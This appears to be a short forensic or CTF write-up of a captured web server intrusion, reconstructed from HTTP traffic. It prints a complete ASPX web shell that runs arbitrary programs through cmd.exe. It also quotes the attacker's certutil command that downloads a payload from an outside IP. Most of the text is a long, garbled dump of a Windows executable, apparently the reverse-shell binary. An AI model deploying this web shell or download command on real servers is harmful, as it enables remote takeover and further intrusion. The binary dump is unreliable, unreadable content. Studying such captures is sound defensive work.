After a quick analysis of end points we can find that there are 5 different endpoints:

If we start filtering by POST methods `http.request.method == POST`: 
```
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub

</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```

We find out that there is a malicious file being posted to `/upload.aspx?operation=upload`.

Then we can find how the attacker is making petitions to the uploaded file in order to retrieve a reverse shell.
If we add the decoded text as a new column, we can perfectly check that there is a reverse shell communicating over there:


```
certutil -urlcache -split -f http://22.22.22.7/JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt c:\users\public\
```

```
%2FwEPDwUKLTk5MjkzMTA5MQ9kFgICAQ9kFgICCw8PFgIeBFRleHQFaw0KPHByZT4qKioqICBPbmxpbmUgICoqKioNCiAgMDAwMCAgLi4uDQogIGIwZDgNCkNlcnRVdGlsOiAtVVJMQ2FjaGUgY29tbWFuZCBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5Lg0KPC9wcmU%2BZGRk8LGROcfmxzGiIEGxxlI6IHeRdyA%3D
```

```
MZÿÿ¸@º´	Í!¸LÍ!This program cannot be run in DOS mode.

$PEd²ÑsNð/f,@9ï À0ØdÄ.textff P`.dataðj@PÀ.rdatal@P@.bss°`À.idata0À@0À.CRThà@@À.tlsHð@`ÀHìHÄÃHì8æ D
ï LðHáH
ÒÈHÁHD$ ècÍHÄ8ÃHì(1Àf=ïÿÿMZÇ« Ç¥ Ç Ç 
 {ÉtS¹è9cHÇÁÿÿÿÿè}Q HðªHáªHvµè;SÒt
k Àt1ÀHÄ(Ã¹èæbë«@H
	RÿµÇ9 1ÀHÄ(ÃfHc
ïÿÿHÂîÿÿH:PEOÿÿÿ·JLBfùt3fù5ÿÿÿº(ÿÿÿ1ÀºøÀéÿÿÿf.Ax\ÿÿÿ1ÀA¸ÐÀéðþÿÿAU1À¹
ATUWVSHì-tHT$ íH×óH«ÃeH%0HX1ÀðH±Ù©1öHÀt6H9Ã@¶t.H=O³1öë	H9Ã6¹èÿ×HððH±£©HÀuß1ö©ø!©À_ÇÍg©øöu
1ÀðHX©HñmHÀtE1Àº1ÉÿÐè;SH
ÿ²²HèrWH
K}H²ÿÓHÀHZ}HÁÿ²HÀt	H
ýÿÿÿÐèfX=PÿtwH9³1ÉHëÒÂÉt1Òt-HÀ¶ú ~çËóú"DËëçHÀ¶ú ÒuðöD$\H´ìÿÿHÝ¦¸
Há¦ÛÍ¦-MHcÉHÁáè`IÄ1ÀíH=~A1Û1öHÆèh`DhMcíLéèQ`IHMèHÁHÃè2`9õÊHcÅHÁàIÇH8éH#²L% HLHè|>5&ö÷Ûuèç_	HÄ[^_]A\A]Ã·D$`éÿÿÿfDr§¾øßýÿÿ¹èª_T§øíýÿÿHËH
rËè_Ç+§éÈýÿÿHÑÿ9°é/ýÿÿHyËH
ZËÇ§èS_éýÿÿH
3{ÿÓHÀãýÿÿH
-{ÿÓHÀÑýÿÿH
{ÿ°HÀÙýÿÿé¶ýÿÿÁè_VSHËHì8H=Àw;=Àrt¾1Ò¹èã^Hø)HÀt7¹ÿÐ¸ÿÿÿÿHÄ8[^Ã=ÀÆ=ÀÖ=Àt©HHÀÍHÄ8HÙ[^ÿàf=À§==ÀuÀ1Ò¹èQ^HøÇHÀt¥¹ÿÐHÄ8¸ÿÿÿÿ[^Ã=ÀtZ=Àu1Ò¹è^Hø«HÀeÿÿÿ¹ÿÐHÄ8¸ÿÿÿÿ[^Ã1öéùþÿÿ=Àt¸=À1ÿÿÿHÄ8¸ÿÿÿÿ[^Ãf1Àéñþÿÿfº¹è¡]ö¸ÿÿÿÿÌþÿÿD$(è«TD$(éºþÿÿfº¹èq]¸ÿÿÿÿéþÿÿº¹èQ]¸ÿÿÿÿéþÿÿHì(ÇBè]THÄ(é¤úÿÿ@Hì(Ç"è=THÄ(éúÿÿUHåHMUëHE¶¾À;EuHEëHEHE¶ÀuÛ¸ÉÃUHåVSHì HMëEìæEä¹Eèé"EäUèÑ)ÁEìUäÓ)ÃØ9ÁEìUäÖ)ÆðEà»ëlØEìHHÁàHEHHEØØEìHHÁàHEUäMìÎ)ÖòUèÚHcÒHÁâHUHHEäUìÑ)ÁÈEèØHHÁàHEHUØHÃ;]à|Eà)EèëuEäUèÓ)ÃØEÔ»ëTØEìHHÁàHEHHEØØEìHHÁàHEÚUäHcÒHÁâHUHHØEäHHÁàHEHUØHÃ;]Ô|§EÔEìEè;Eä~Eä;EìÊþÿÿu)Â~XvHÄ [^ÉÃUHåHì HMÇ4.LF<HÇH
wèýZHHE¶<-uÇùHEë>HE¶<+uÇÝHEë"H×HÀtÇÀë
Ç´HEÉÃUHåATWVSHìpMHULE LM(HÇoqÀuHE HÁèÿÿÿHE H^HÀtHR¶À\IøJH9Ât>9ÂtHEHÁè%ýÿÿë0 ö9ÂtìëÞÀÕëÌ;E}8ÁHHÁàHEH¶<-uÉ§HHÁàHEHHÀ¶Àt«§};EnHHÁàHEHHruHÁèRYÀukHÀ?YW9ÂtM#9ÂtHEHÁè4üÿÿë+)9ÂuûEEãÝ;Eu&òð9Âtâ¼¸ÿÿÿÿé¬HHÁàHEH¶<-uHHÁàHEHHÀ¶ÀuBÀu
¸ÿÿÿÿé5`HcÐHÁâHUHHCÀB¸é2HHÁàHEHH}(t%HHÁàHEHHÀ¶<-u¸ë¸HHÀHHëH}(ÒHHÁàHEHHÀ¶<-tZ}8fªHHÁàHEHHÀ¶Àu2HHÁàHEHHÀ¶¾ÐHE HÁèQúÿÿHÀHÇEÈÇEÄÇEÀHKHEØëHEØHEØ¶ÀtHEØ¶<=uåHE(HEÐÇE¸éHUØHHÑH)ÁHÈHÁHøHEÐHIÈHÁèæVÀuYHEØÂHÕÓ)ÃHEÐHHÁèzV9ÃuHEÐHEÈE¸E¼ÇEÄë7H}ÈuHEÐHEÈE¸E¼ëÇEÀHEÐ E¸HEÐHHÀZÿÿÿ}À}ÄbÀt?DHHÁàHEH8HEH0HDrHî§ÿÐHÀ`IùIðHÚHÁèVHHHÁèµUHHòäÀÛ¸?é H}È\E¼E¸ºÀ±HEØ¶ÀHEÈ@ÀtHEØHÀHé´5aÀoHHèHÁàHEHHÀ¶<-u5HEÈH8HEH0H~qH§ÿÐHÀ`IùIðHÚHÁè0UëVHEÈH0HHèHÁàHEH¶D¾àHEH8H[qH°¦ÿÐHÀ`Ht$ EáIøHÚHÁèØTHÉHÂHÁèrTHH¯¸?élHEÈ@ø¾;E})|HcÐHÁâHUHH_À^é`ÀtCIHHèHÁàHEH8HEH0HÊpHï¥ÿÐHÀ`IùIðHÚHÁèTH
HHÁè¶SHHóHE ¶<:u¸:ë¸?éHÐHÉHÁèySHH¶H}0t	HE0U¸HEÈH@HÀtHEÈH@HUÈR¸éEHEÈ@é9}8t@^HHÁàHEHHÀ¶<-t"HG¶¾ÐHE HÁèöÿÿHÀÚÖ^À¥HHÁàHEHHÀ¶<-u5H=ùHEH0H«oH¨¤ÿÐHÀ`IùIðHÚHÁèÕRëRH5Ä¶HHÁàHEH¶D¾àHEH8H|oHY¤ÿÐHÀ`Ht$ EáIøHÚHÁèRHroHk]ÀT¸?éHK¶U·HÀH:¾U·HE HÁè
õÿÿHE¨H¶Àu
ÀH}¨t
}·:¢]ÀtnH÷HÀt2¾}·HEH0HÑnH£ÿÐHÀ`AùIðHÚHÁèºQë0¾}·HEH0H¹nH[£ÿÐHÀ`AùIðHÚHÁèQ¾E·*]¸?é3HE¨HÀ¶<:HE¨HÀ¶<:uHHC¶ÀtH5H ÀëHÇHÇéÅHû¶Àt"HíHÖØÀÏéÄ;Eu[q\Àt0¾}·HEH0HãmHh¢ÿÐHÀ`AùIðHÚHÁèP¾E·7\HE ¶<:uÆE·:ë*ÆE·?ë$^HcÐHÁâHUHHAÀ@HÇ=¾E·HÄp[^_A\ÉÃUHåHì0MHULE HU HEÇD$(HÇD$ A¹IÐHÂMèHõÿÿÉÃUHåHÄHÇEøHÇEÈHÇEÀ¹0èfOHEøH}øu
¸éLHEøHÇHEøHÇ@ÇEÐHÇEØÇEàHEøHMÐHUÀA¹IÈHÁHqÿÐEô}ôuXH¿ÿÐA¸
H4Áè
NHÇD$0HÇD$(HÇD$ A¹A¸HÂH
\lèéHEøHPHMÐHEÈA¹IÈHÁHëÿÐEô}ôuXH9ÿÐA¸
H®ÁèMHÇD$0HÇD$(HÇD$ A¹A¸HÂH
lèéHUÀHEÈHÁèðHUøHBHEÈHÁHZÿÐHEÀHÁHJÿÐHEøH@HÀu:HÇD$0HÇD$(HÇD$ A¹A¸ºH
²kèëHEøHÇ@ÿÿÿÿHEøéHEÈHÀtHEÈHÁHÕÿÐHEÀHÀtHEÀHÁH¼ÿÐHEøHHÀtHEøHHÁHÿÐHEøH@HÀtHEøH@HÁH|ÿÐHEøHÁèjM¸ÉÃUHåSHìHMè^ýÿÿHEèÇEÀHÇEÈÇEÐHEèHUHPH
XH]èHEÀHU¼HT$(ÇD$ IÙIÈºHÁHÿÐHUèHB HEèH@ HÀuiHAÿÐA¸
H¶ÁèKHÇD$0HÇD$(HÇD$ A¹A¸HÂH
Vjè
HEèHÇ@ÿÿÿÿ¸éíH
^H]èHEÀHU¼HT$(ÇD$ IÙIÈºHÁHZÿÐHUèHB(HEèH@(HÀHÿÐA¸
HýÁèÖJHÇD$0HÇD$(HÇD$ A¹A¸HÂH
iè[HEèHÇ@ÿÿÿÿHEèH@(ºHÁH¹ÿÐ¸éHEèH@ HE HEèH@(HE¨HEèH@HE°HE A¹ÿÿÿÿA¸HÂ¹HÿÐEäEäøtDøtvÀ¢HEèH@(ºHÁH9ÿÐHEèH@ºHÁHÿÐé¿HEèH@ ºHÁHÿÐHEèH@ºHÁHáÿÐéHEèH@(ºHÁHËÿÐHEèH@ ºHÁH²ÿÐëTHÿÐA¸
H|ÁèUIHÇD$0HÇD$(HÇD$ A¹A¸HÂH
ThèÚ
HEèH@ºHÁH#ÿÐHEèH@HÁHÿÐHEèHHÁH<ÿÐHEèHHÁHÿÐHEèH@HÁHÿÐHEèH@HÁHÙÿÐHEèH@ HÁHÅÿÐHEèH@(HÁH±ÿÐHEèH@HÁHÿÐHEèHÁèI¸HÄ[ÉÃUHåSHìèHMHUHÇEèÇ`ÿÿÿhHÇhÿÿÿHÇxÿÿÿHÇpÿÿÿÇEEEEEEEfÇE HÇE¨fÇE¢ÇEHEHE°HEHE¸H>ÿÐHÃH2ÿÐH`ÿÿÿHJ`HUÇD$0ÇD$(ÇD$ IÉIØHÁHÙÿÐH$HUÐHT$HH`ÿÿÿHT$@HÇD$8HÇD$0ÇD$(ÇD$ A¹A¸HÂ¹H^ÿÐÀtHEÐHEèHEØHÁH2ÿÐëSHÿÐA¸
HÁèÝFHÇD$0HÇD$(HÇD$ A¹A¸HÂH
fèbHEèHÄè[ÉÃUHåHìàHMHEHEèééÆE÷lýÿÿÀtCHEèHHlýÿÿH ÿÿÿHÇD$ IÉA¸ÈHÁH:ÿÐÇEüÇEøëb¹2HLÿÐéEü¶ ÿÿÿ<
u}÷
tEøÆpýÿÿ
EøEü¶ ÿÿÿEøpýÿÿEø¶pýÿÿE÷EøEülýÿÿ9Eür¦MøHpýÿÿHEèH@A¹AÈHÁH¦ÿÐÀ~FHEèHHlýÿÿH ÿÿÿHÇD$(HÇD$ IÉA¸ÈHÁHFÿÐÀÓþÿÿëHâÿÐømtSHÔÿÐA¸
HIÁè"EHÇD$0HÇD$(HÇD$ A¹A¸HÂH
qdè§¹HTÿÐUHåSHì(HMHEHEàÇEìé¯¶UßEìÿÿÿEì¶Eß<
uEìÆÿÿÿ
EìHÿÿÿA¸H*dHÁè}DÀu¹HÙÿÐ¶Eß<
t¶Eß<
t	}ìÇv?HEàH@HÿÿÿMìHÿÿÿHÇD$ IÙAÈHÁHÿÐÀt5ÇEìHUßHEàH@A¹A¸HÁHÝÿÐÀ%ÿÿÿë¹HDÿÐUHåHìÀfÇEþ·EþH`þÿÿÁHÿÐEø}øu&·`þÿÿ<u·`þÿÿfÁè<t
HËÿÐëÉÃUHåME=F'ö=F'Z=9'D=9'¢=('Ú=('H='¤='='z='{é¤='=&'é=5'¤=5'=3'z=4'{é\=7'=7'és=?'Ô=?'H=<'=<'=:'t=;'ué=='}=>'~éç=B'=B'=@'t=A'uéº=D'=D'ém=S'=S'¢=L'¸=L'H=I'=I'=G'X=H'YéJ=J'a=K'bé/=O'=O'=M'X=N'Yé=Q'm=Q'néQ=l'¦=l'H=V'p=V'=T'L=U'Jé¨=W'L=k'Sé=ù*^=ù*=m'C=u'é`=û*C=û*/=ü*6é:HA`é5HD`é)HG`éHJ`éHM`éHP`éùHS`éíHV`éáHY`éÕH\`éÉH_`é½Hb`é±He`é¥Hh`éHk`éHn`éHq`éuHt`éiHw`é]Hz`éQH}`éEH`é9H`é-H`é!H`éH`é	H`éýH`éñH`éåH`éÙH`éÍH`éÁH¡`éµH¨`é©H«`éH®`éH±`éH´`ë|Hº`ësHÀ`ëjHÆ`ëaHÌ`ëXHÒ`ëOHØ`ëFHÞ`ë=Hå`ë4Hì`ë+Hó`ë"Hú`ëHaëHaëHaÉÃUHåVSHì@HMHULE LM(·Î{fÀ¾H]HôÿÐHH`Hu HUHE@HD$8HE8HD$0HE0HD$(HE(HD$ IñIÐHÚèø>H-ÿÐÀt7H ÿÐÁèLúÿÿHÆH`HÿÐHÀ`IðHÚHÁè¶>ëHiÿÐHÀ`HÂ¹
èÊ>HOÿÐHÀ`HÁè½>HÄ@[^ÉÃUHåSHìHHMHULE LM(fÇÝzH](HM HEHU@HT$0HU8HT$(HU0HT$ IÙIÈHÂHMèµþÿÿÔIHºHÁHÿÿÐ»IHHÁHcÿÐ¹HÿÐ¹è=UHåHì HÂÿÐÇ·AzføvÛyÙyAÐÂH
yIèÿÿÿH
P_èÿÿÿÉÃUHåHì yÀuH
7_èóþÿÿyÂH
©è<UHåHì0MU¹õÿÿÿHÖÿÐHEøÉÃUHåHì0MEÀàüEüEüHÁèÀ<HEðH}ðtUüHEðIÐºHÁè6=ëEüÂH
Ä^èfþÿÿHEðÉÃUHåVSHMUH}u¸ëF} v¸ë6]Huë&¶<
uHðÂHEÑ)ÁÈÃÃØëHÆëÛÖE[^ÉÃUHåHì HMHUHUÿÐÇHEHHEHÁè.;Àt$HEHHEIÐHÂH
^è¸üÿÿ¸ë¸ÉÃUHåWVSHì8HMÐfE»HêÿÐÇH}t
¹àè£þÿÿHÃHÛuH
Ý]èLýÿÿH~GHØHÁèÿ;HMHXÿÐEÐEÐøÿÛf}tHUH
±]èýÿÿHMHýÿÐHEØH}ØuH¡ÿÐAÀHUH
]èÓüÿÿHEØHHÂHØA¸HÁè;¾ëHEØH@HcÖHÁâHÐHHÀHcÎHÁáH
A¸HÂè:HcÆHÀpÁHÿÐHÁHHÇHcÖHÐHÀHÐHÁàHA¸HÊHÁè;ÆHEØH@HcÖHÁâHÐHHÀt	þ^ÿÿÿ·wfÀuHØé×¾éHÀHcÖHÁâHÐA¸ºHÁHÄÿÐHEØH}ØtHEØHHÀu=HdÿÐÁHHÇHcÖHÐHÀHÐHÁàHAÈHÂH
q\èúÿÿëHEØHÂHÙèkýÿÿÆHcÆHÀpÀ*þWÿÿÿéHÀHUÐA¸HÁèG9EÐÁHOÿÐHÂHA¸ÀHÁèÑ9f}tHØéÑ·íufÀuHØé½HEÐA¸ºHÁHÁÿÐHEØH}ØuHmÿÐAÀHUH
Ñ[è¯ùÿÿëvHEØHHÂHØA¸þHÁèO9HØHÁHvÿÐHEØH}ØtHEØH@HHÀu"H
ÿÐÂHØAÐHÂH
[èHùÿÿëHEØHÂHÙè,üÿÿHØHÄ8[^_ÉÃUHåHì@HMUHHDHEð·÷tfÀtH5DHEðHÀtÆ?H¶tÆ@}¾H}t
¸é§EfEþ·£tfÀQ·EþÁH·ÿÐfEî·EîHUðÁHÿÐHEàH}àHEà·@·ÀÁHÿÐfEî·Eþf;Eît·Uî·EþAÐÂH
ËZèAøÿÿHEàHHÂHýsA¸@HÁèß7é¿H}©}t
¸éßHMè¾7fEþf}þt·EþÂ¹è³þÿÿé¶·¹sfÀt
¸é HEðHÂHMHªÿÐHEàH}àt;HEàHHÂH`sA¸@HÁèB7HEà·@·ÀÁH¢ÿÐfEþë¸ë?ë·UþHÿYH
sHÁ@AÐHÂè
7Hs·UþfPHHôr·@HÉÃUHåVSHì HM»pë(èÜ6·ððHE¶<uðHEÆë¾ëÛuÔötðë3»ÿÿëØHE¶<uØHEÆëëÛuáÛtØë¸HÄ [^ÉÃUHåHì0HMÐDÂfEfU H}uH
%Yèa÷ÿÿf}tf} u·U ·EAÐÂH
Yè:÷ÿÿ·E fEþë·EþHEÆfmþ·Ef;EþvæÉÃUHåVSHì@HMÐLE DÊfEfU(H_ÿÐÇ¹HÿÐ·ÎqfÀt!A¸º¹H.ÿÐV{ëA¸º¹H
ÿÐ5{/{ÀyH
oXèvöÿÿ{Àu{ÁèÌ3{H'|õzHÇD$ IÑA¸ºÿÿHÁHÿÐÃûÿuH
Xè%õÿÿHËpfÇHÇpfÇH} tH¬pHHHE A¸HÂèö3f}(tHp·E(ÁHßÿÐfC»H} uf}(«·E(EèÇEìéHDpHÂ'zHA¸HÁHMÿÐÃÛtjHÎÿÐ=@'u[·u(Hp@ÁHlÿÐAðHÂH
IWè7ôÿÿ¹HÌÿÐHÿÐÇmì}ìnÿÿÿëëÛt+·](H¤o@ÁHÿÐAØHÂH
þVèÇôÿÿ·µofÀt^yé,HnoHÀA¸HUHÁè°2HQo·EÁH ÿÐfCoÀtH
µVèsóÿÿ^oÂ¹èrõÿÿèñ1HÂH
yè*3Àu(H÷nHÂÒxHA¸HÁHÿÐÃë»ÿÿÿÿ¹L'HÁÿÐº¹èõÿÿÛuxë_HMÿÐHÃHÿÐoxHºHÁH&ÿÐVxHHÁHÿÐH	ÿÐÁHLÿÐ¸ÿÿÿÿHÄ@[^ÉÃUHåSHìhHMÐLE DÊfEfU(HÇEèHÀÿÐÇ·M(·EHU AÉIÐÂHMèüÿÿEÌ}Ì
¸ÿÿÿÿé¨·
nfÀtf}(u5H
Uèøòÿÿë'HcEÌºHÁHÿÐÃÛyH
wUèÏòÿÿ·ÇmfÀ
ÇEÔHnmHÂHcEÌHMÔIÈHÁH²ÿÐÃÛyH
BUèñÿÿHOUH,wA¸HÁè0Hm@Àt)Hm@ÁHyÿÐHÂHñvHÁè)1ë(HàvHÙèP0HA¸HòTHÁè'0H¸vHÙè(0HA¸	HÎTHÁèÿ/Hl·@·ÀÁHÿÐfEæ·UæHovHÁèÂðÿÿ·¨lfÀ¨ÇEÔlÂ¹èªòÿÿè)/HÂH
?vèb0À¾H+lHÁHvHcEÌH]ÔH\$(HL$ A¹A¸ HÁHÿÐÃº¹èBòÿÿHßkHÂHcEÌA¸HÁHôÿÐÃéÇEÔîkÂ¹èòÿÿè.HÂH
uèº/ÀHkHÂHcEÌHMÔIÈHÁHÿÐÃº¹è´ñÿÿHcEÌºHÁHñÿÐHcEÌHÁHYÿÐ]ÌÛÉHuA¸@ºHÁè/H÷tHÀ HEØÇEÔHéjHÂHcEÌHMÔIÈHÁH-ÿÐÃÛyH
òRèïÿÿH¶j@ÁHÿÐHÂHEØHÁè¡.Hj·@·ÀÁHÿÐfEæH}j@ÁHÝÿÐHÂHUtHÁè].·j·ÐH<tHÁèåñÿÿHEèHåÿÐÇÇEÔH}t'HEèHÀA¸HÂHMè?.ÀtÇEÔf}t·Eæf;EtÇEÔEÔÀt2·UæHEèHHÃHMèHEØT$ IÙIÈHÂH
øQèæîÿÿ·UæHEèHHÃHMèHEØT$ IÙIÈHÂH
öQèÄíÿÿEÌë@ëHÿÐÇL'ëHcEÌºHÁH÷ÿÐHcEÌHÁH_ÿÐ¸ÿÿÿÿHÄh[ÉÃUHåSHì(MHUHtEHA¹A¸HÁHÿÐÃûtH~ÿÐÂH
vQè$íÿÿiÀtiÁH¬~ÿÐëvfÇëhÇåhHEA¹A¸ºizHÁè³öÿÿÃÛ~EHºHÁHÿÐHcÃHÁHÿÐÇh·hÀf~hHë}ÿÐÇH8sEHA¹A¸HÁH±ÿÐÃûuEë,EHºHÁHÿÐEHHÁHÿÐ¸ÿÿÿÿHÄ([ÉÃUHåAUATWVSHì8MHUDE gÀuH
iPèßìÿÿ} §H³g}tÆ<dgEÈëÆ>ZgEÈHÃÆ H}E EÌH{gHÀ;Æ#HmgHÀ<Æ éB¾ÇEÄN9uÌ}QEÄèEÌEÄUÌÐÀÐpH1gHcÆH¸Æ+uÌëÆ HÃÆ HÃÆ HÃîöuäuÌ)uÌHµOHîfHJUÈAÐHÂèÔ*uÈHÒfHXHÇfL`=ëm¶ÀèD¶èDêH=6¶HÃ¶¶ÀAÅAåDêH6¶HÃÆ HÃ¶<v¶<~w	¶A$ëAÆ$.IÄHÇîöuAÆ$
MÄHAfïeAÈÁèÁ(ÆöyH
ëNè:ëÿÿ}Ì´þÿÿëHÄ8[^_A\A]ÉÃUHåWVSHì(HMU¿H]ué¶<ÿu~ÆfÿHÃî¶<ût¶<üu¿þÿÿÿ¶<ýt¶<þu¿üÿÿÿ@ÿtF@=ÎeHÃî¶¿eH¶eÎ4HA¹A¸HÁHâ|ÿÐ¿ëHÃîökÿÿÿHÄ([^_ÉÃUHåAUATWVSHìxMÇE ÇE¤èHEHÁèø'¹H°zÿÐÀuº¹H¹zÿÐ¹HzÿÐE¸}¸uº¹HzÿÐH¢oø?wH
oHouÓHtÙÂfÇE¶fÇEÄÇEÈEÈEÌ9dÀ´+dEÌL%MofÇEÄ·Ä3fÀtÇdéÇEÀëbHoUÀHDÐHÀuJë'HþnH÷nMÀÁÉHLÊUÀHLÐEÀH×nè;EÀwÈHÆnêëEÀH²n;EÀw¹èY&ÇcÀt½cÁHtyÿÐH+yÿÐÇ¹HgzÿÐé÷fÇEÆ f}ÄtfÇEÄéH-mH>nHÃ¸AH×HÞHÁóH¥HcHÀtHÿbHcA¸HÁèZ&HãlHU HT$ A¹A¸HÂ¹HkzÿÐÃÛyUH¼yÿÐ='tEH¬yÿÐE°H
¡KèòæÿÿEºHÁHAzÿÐEHÁHªyÿÐ¸éOÛHEHÁèf%bÀt|HUHEH)ÂH2bHH9Â~a·tbføvH
1KèsæÿÿEºHÁHÂyÿÐEHÁH+yÿÐHþlÇ¹HèxÿÐ¸éµHÁkEHÁèÀÝHEHÁèº$H£kEA¹A¸ HÁHyÿÐÃÛÇE¼ëeH~lU¼HTÐEH9ÂuJë'HelH^lM¼ÁÉHLÊU¼HLÐE¼H>lè;E¼wÈH-lêëE¼Hl;E¼wÇEÌë ]ÈL-ïj·HafÀt
ÚLéèûÿÿ}Ì}¸³è#ÀýHÉkHÁèù$·ô`fÀt(H®kHÙè$HA¸HIHÁèÝ#HkHÙèÞ#HA¸HwIHÁèµ#H^kHÁè¶#Ã]ÌL%Jk·Ç/fÀukØ
`¹èÜ"ëWH#kA¸ HÂ¹èÐ"ÃÛ¹è°"ë+]ÌL%ôj·q/fÀuØ´_¹è"ë}Ì w	}È v$UÈEÌAÐÂH
»HèíãÿÿÇEÈEÈEÌf}ÆuH
¹HèÍãÿÿ¸éM}ÈtbEÈAÀLê¹è"ÃHÊtÿÐHÁè<#Û~8·u_fÀtAØLê¹èX÷ÿÿHcÃIÅØ)EÈû^Øð^}Ìt[0_ÀtEÌÂLáèÎåÿÿÃë]ÌEA¹AØLâHÁHovÿÐÃÛ~HcÃIÄØ)EÌ^Ø^Õ^Àt"Ë^ÁHtÿÐH9tÿÐÇë}Ìu}Èt
fmÆé¢þÿÿHfiEHÁèÀïúÿÿEºHÁHíuÿÐEHÁHVuÿÐ¸HÄx[^_A\A]ÉÃUHåVSHÄMHUèhHÇEèHÇE¸HÇEàHÇEØfÇEÖfÇEÔfÇE¶fÇEÒfÇEÐHÇEÈÇEÄèÜÿÿ¹è*äÿÿH]¹èäÿÿH]¹ èäÿÿHh¹ è÷ãÿÿHbg¹èæãÿÿHah¹èÕãÿÿH8g¹JèÄãÿÿHW]¹è H>hH7hÆHÉrÿÐÇÇ,ëë}HEH¹èhãÿÿHEHEH¹ èSãÿÿHÃHEHÀHH4rÿÐHP`HýEIÑA¸
ºHÁèå H
rÿÐHÀ`HÁèx A¸ HÚ¹è=K\E\ÀuH
³Eèáÿÿ/\ÂHÙè$ãÿÿÆöt\ðÑ)ÁÈ\\Àt!û[ÁHcÆHHgIÈHÁè\HEHÀHº
HÁè< HÃHÛtÆHEHÀHº
HÁè HÃHÛtÆHEHÀHHÃ¾ë,¶< uÆëHCÿ¶ÀuHcÆHÁàHEHÆHÃ¶ÀuÍuéF¹ø3[ÀHHFHcÐHóEHÿàH
Dèlàÿÿ·R[ÀfH[é6H´ZHU[é#·1[Àf'[ÇEÄéHðnÿÐéøHvZHÁèÞÆötðà9ðu5A*éÏòH
Dèáßÿÿé¼sZø~H
3DèÅßÿÿHZHÀu¹PèòàÿÿHuZ·Z·ÐHüYHÁèõáÿÿHE¨H}¨tHJZZHcÒHÁâHHE¨HüYÀóYé1H»oÿÐÇèÂHYHÁè%ÿÿZZiÀèZüYÀßHaYHÂH
lCèíÞÿÿéÈ·ÖYÀfÌYé²·ÂYÀf¸YéHYHY· YÀfYéxHöXºHÁèiäÿÿfEÖf}ÖTHÓXHÂH
÷Bè_Þÿÿé:·NYÀfDYé$·4Y·ÐHXHÁèàÿÿHE¸HE¸HÀHEàéô·"YÀfYéÞ·þXÀfôXéÈ·ÞXÀfÔXé²·ÊXÀfÀXéHXHÁè¨X¢XÀuHûWHÂH
5BèÝÿÿ¹èÀÞÿÿH#X¹è¯ÞÿÿHXHXYXë4·RXÀfHXë!H«mÿÐÇH
éAè&ÝÿÿëëHELâAHÂMèQËÿÿÆþÿWüÿÿ·óWfÀt¹è®Áèÿ¹èÞÿÿHEÈHÚWHÀt¹è;fÇ®WÇDW·WfÀtQH}WA¸´ºHÁèWWÀHSWHÂH
NAè_Üÿÿ¹dèÝÿÿH3WµVHHÁàHEHHÀt)·&W·ÐVHHÁàHEHHÁèwÞÿÿHEèH}ètHEèHÀHÀtHEèHÀHEØH}ØtIVÀ@VH=lÿÐÇ·²VfÀfÇEÐVHHÁàHEHHÀtMýUHHÁàHEHºHÁè[áÿÿfEÐf}Ðu"ÒUHHÁàHEHHÂH
F@èIÛÿÿ·]Ö·UÐHMàHEØAÙIÈHÁè¯çÿÿZ%T%À~rH!VHÀt>%HHÁè!ÌÿÿHVHÀu"%ÁèðÿÿÆ·ÜUføvvUtUAÐÂH
%èÊÙÿÿ}ÄløÿÿñèöH
ª?èÚÿÿH}ØuH
¥?èÚÿÿñTHHÁàHEHHÀuH
?èfÚÿÿÍTHHÀHÁàHEHHÀt	fÇ$·EÖfEÔé4fÇE¶·E¶fEÒTHHÁàHEHº-HÁèHÃHÛt.ÆHÃºHÙèÏßÿÿfEÒf}ÒuHÚH
Í>èÐÙÿÿ7THHÁàHEHºHÁèßÿÿfE¶f}¶u"THHÁàHEHHÂH
>èÙÿÿ·EÒf;E¶vMfÇÁ#·EÒfEÐ·\TfÀ;·MÒ·U¶HEÈAÈHÁè´áÿÿHEÈHÁè$áÿÿfEÐé·E¶fEÐéf}Öu#·TfÀtèìfEÔf}ÔÿwfEÔ ·EÐÂ¹èÊÞÿÿfEÐ·]Ô·UÐHMàHEØAÙIÈHÁè¯áÿÿò"ì"À~/·±SfÀt#·SfÀtÊ"HUØÁè"êÿÿ¹"³"À¾HGSHÂ·]ÐHEèHHÁHEèHT$ AÙIÈHÂH
{=èH×ÿÿH>SHÀt["HHÁè>Éÿÿ·SfÀHSHÀux/"ÁèíÿÿÆëg¾·4"fÀu·ÖRføwHiÿÐ=M't9HRHÂ·]ÐHEèHHÁHEèHT$ AÙIÈHÂH
à<èÖÿÿ·!HºHÁHâiÿÐ!HHÁHFiÿÐFRÀt<RÁHógÿÐ·4RfÀtHEÈHÁèßÿÿfEÐëfmÐ·E¶f;EÐðýÿÿvQÀmQgQHHÁàHEHHÀ°üÿÿHNgÿÐÇ·ÍQføvgQeQAÐÂH
<è»ÕÿÿHUhÿÐ}ÄWôÿÿ·â fÀtñèÒ¹èÈUHåHì fÇiQH
¨<ènÕÿÿH
\=èbÕÿÿH
=èVÕÿÿH
¤=èJÕÿÿH
@?è>ÕÿÿH
T?è2ÕÿÿH
